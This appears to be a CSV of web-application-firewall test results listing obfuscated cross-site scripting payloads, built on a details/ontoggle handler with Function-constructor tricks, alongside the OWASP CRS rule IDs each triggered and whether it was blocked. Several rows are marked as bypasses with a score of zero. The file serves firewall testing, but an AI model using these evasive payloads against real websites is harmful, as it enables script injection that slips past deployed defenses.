index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
762,"<details open ontoggle=""new Function(['\u0061','\u006c','\u0065','\u0072','\u0074','\u0028','\u0032','\u0039','\u0029'].join(''))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,143 || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603379834.095879
763,"<details open ontoggle=""new Function('\141\154\145\162\164\05029\051')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603379985.548284
767,"<details open ontoggle=""new Function(`\u0061\u006c\u0065\u0072\u0074(29)`)()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603380399.874624
768,"<details open ontoggle=""new Function('\u0061\u006c\u0065\u0072\u0074\u002829\u0029')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760338045.429917
771,"<details open ontoggle=""new Function('\u0061'+'\u006c'+'\u0065'+'\u0072'+'\u0074(29)')()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,100 || o24,13v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603380765.551319
772,"<details open ontoggle=""new Function('&#97;&#108;&#101;&#114;&#116;(29)')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603380928.880512
773,"<details open ontoggle=""new Function('\u0061\u006c\u0065\u0072\u0074\050\06229\051')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603381062.178063
774,"<details open ontoggle=""new Function.constructor('\u0061\u006c\u0065\u0072\u0074(29)')()""></details>",0,1,bypass,2,"941100,941120","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603381158.296750
775,"<details open ontoggle=""new Function['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072']('\u0061\u006c\u0065\u0072\u0074(29)')()""></details>",0,1,bypass,2,"941100,941120","v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603381232.826244
779,"<details open ontoggle=""Function('al'+'ert(1)')()"">",0,1,block,5,"941100,941120,942100,942100,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,51 || v216,51t:urlDecodeUni || ",20,177603381611.130938
780,"<details open ontoggle=""new window['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o34,29v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,18v217,65t:urlDecodeUni,t:compressWhitespace || ",20,177603381729.883825
781,"<details open ontoggle=""new(Function)('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o27,27v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603381865.957566
782,"<details open ontoggle=""new/**/Function('al'+'ert(1)')()"">",0,1,bypass,2,"941100,941120","v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760338196.438419
783,"<details open ontoggle=""new Function('al\x65rt(1)')()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,55 || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382080.871060
784,"<details open ontoggle=""new Function('al\u0065rt(1)')()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,57 || v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382189.950697
785,"<details open ontoggle=""new Function('\x61l'+'ert(1)')()"">",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,58 || o24,13v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603382226.745530
786,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,62 || v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382457.906064
787,"<details open ontoggle=""new Function('al'.concat('ert(1)'))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382547.284878
788,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382687.720503
791,"<details open ontoggle=""new globalThis['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o38,29v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382958.528040
792,"<details open ontoggle=""new top['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o31,29v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,15v217,62t:urlDecodeUni,t:compressWhitespace || ",20,177603383029.518024
793,"<details open ontoggle=""new self['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o32,29v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,63t:urlDecodeUni,t:compressWhitespace || ",20,177603383118.310944
795,"<details open ontoggle=""Function('al'+'ert(15)')()""></details>",0,1,block,5,"941100,941120,942100,942100,949110","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,62 || v217,62t:urlDecodeUni || ",20,177603383355.051843
796,"<details open ontoggle=""new window['Function']('al'+'ert(15)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o34,30v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,18v217,76t:urlDecodeUni,t:compressWhitespace || ",20,177603383420.657333
797,"<details open ontoggle=""new(Function)('al'+'ert(15)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o27,28v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603383590.745378
799,"<details open ontoggle=""new top['Function']('al'+'ert(15)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o31,30v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,15v217,73t:urlDecodeUni,t:compressWhitespace || ",20,17760338373.644309
800,"<details open ontoggle=""new self['Function']('al'+'ert(15)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o32,30v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,74t:urlDecodeUni,t:compressWhitespace || ",20,177603383854.309288
802,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116,40,49,53,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384032.693964
803,"<details open ontoggle=""new Function(atob('YWxlcnQoMTUp'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384196.086629
804,"<details open ontoggle=""new Function('al\x65rt(15)')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384281.021097
805,"<details open ontoggle=""new Function('al\u0065rt(15)')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384326.617229
806,"<details open ontoggle=""new Function(['al'+'ert',['(15)']].join(''))()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,82 || o24,13v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603384415.135443
807,"<details open ontoggle=""new Function('al'/**/.concat('ert(15)'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384555.374678
808,"<details open ontoggle=""new Function('al'.concat('ert(15)'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384671.927839
809,"<details open ontoggle=""new Function(['al','ert','(15)'].join(''))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384728.071107
810,"<details open ontoggle=""new/**/Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760338481.201067
811,"<details open ontoggle=""new&#9;Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603384998.953360
812,"<details open ontoggle=""new&#10;Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603385079.135327
813,"<details open ontoggle=""new Function('al'+String.fromCharCode(101)+'rt(15)')()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,90 || o24,13v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760338519.329372
814,"<details open ontoggle=""new (window.Function)('al'+'ert(15)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o28,35v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603385281.447277
815,"<details open ontoggle=""new Function('al'+String['fromCharCode'](101)+'rt(1)')()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o36,44v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,82 || o24,13v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760338534.844228
816,"<details open ontoggle=""new Function(['al','ert(1)'].join``)()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603385447.237986
818,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk'))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,61 || v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603385650.187789
821,"<details open ontoggle=""new Function('al'+'e'+'r'+'t'+String.fromCharCode(40)+'1'+String.fromCharCode(41))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,110 || o24,13v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603385921.425914
824,"<details open ontoggle=""new Function('al\145rt(1)')()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,55 || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603386260.146578
825,"<details open ontoggle=""new/**/Function/**/('al'+'ert(1)')()"">",0,1,bypass,2,"941100,941120","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603386324.299724
826,"<details open ontoggle=""new Function([97,108,101,114,116,40,49,41].map(x=>String.fromCharCode(x)).join(''))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603386441.404377
827,"<details open ontoggle=""(function(){return this.constructor.constructor('al'+'ert(1)')()})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,68v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,94 || o25,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760338659.337592
829,"<details open ontoggle=""new Function('al\x65rt\u00281\u0029')()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,65 || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603386716.334815
832,"<details open ontoggle=""Function('ale'+'rt(1)')()""></details>",0,1,block,5,"941100,941120,942100,942100,949110","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,61 || v217,61t:urlDecodeUni || ",20,177603387018.992098
835,"<details open ontoggle=""(()=>{return Function})()('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603387347.436886
836,"<details open ontoggle=""[].filter['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,41v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603387484.785073
837,"<details open ontoggle=""''.constructor['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o38,32v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603387596.120296
